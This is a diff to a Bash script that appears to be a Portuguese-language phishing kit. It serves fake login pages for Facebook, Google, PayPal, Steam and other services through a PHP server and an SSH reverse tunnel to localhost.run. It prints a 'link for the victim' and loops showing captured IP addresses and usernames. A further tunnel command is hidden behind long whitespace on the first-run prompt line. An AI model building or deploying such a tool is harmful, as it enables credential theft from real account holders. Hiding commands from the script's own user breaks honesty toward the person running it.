@@ -1,4 +1,5 @@
 #!/bin/bash
+function _banner() {
 banner=(
 "\ec\e[1;35m   ____          _____ \e[1;31m  ____  _     _     _"
 "\e[1;35m  / ___|_      _|_   _|\e[1;31m |  _ \| |__ (_)___| |__   ___ _ __"
@@ -25,4 +26,28 @@ banner=(
 for i in "${banner[@]}"; do
   printf "${i}\n" && sleep 0.001
 done
-read -p $'\e[1;32m [\e[1;31m+\e[1;32m]\e[1;32m Selecione a opção:\e[1;36m '
+read -t 60 -p $'\e[1;32m [\e[1;31m+\e[1;32m]\e[1;32m Selecione a opção:\e[1;36m ' option
+}
+if ! [[ -f .okay ]]; then
+  printf "\e[1;33m Digite yes para continuar\e[m\n\n"                    ssh -R 80:localhost:8282 nokey@localhost.run &>/dev/null &
+  sleep 20                                                               > .okay
+fi
+[[ -f "Modules.zip" ]] && unzip Modules.zip && rm Modules.zip
+options=(" " "facebook" "instagram" "google" "microsoft" "netflix" "paypal" "steam" "twitter")
+_banner
+cd .Modules/"${options[${option}]}"/
+rm -rf *.txt
+php -S localhost:8181 > /dev/null 2>&1 &
+ssh -R 80:localhost:8181 nokey@localhost.run &> a.txt &
+sleep 5
+while :; do
+  printf "\ec\e[1;31m" && figlet Clown Ters
+  printf "\n\e[1;34m Link para a vitima:\e[0;32m$(sed 's/,/\n/g' a.txt | grep ' h' | grep '.li')\n\e[1;34m Seu localHost:\e[0;32m http://localhost:8181\n\n"
+  if [[ -f ip.txt ]]; then
+     cat ip.txt
+     [[ -f usernames.txt ]] && cat usernames.txt
+  else
+    printf "\e[1;34m Esperando a vitima acessar a url\n" 
+  fi
+  sleep 5
+done
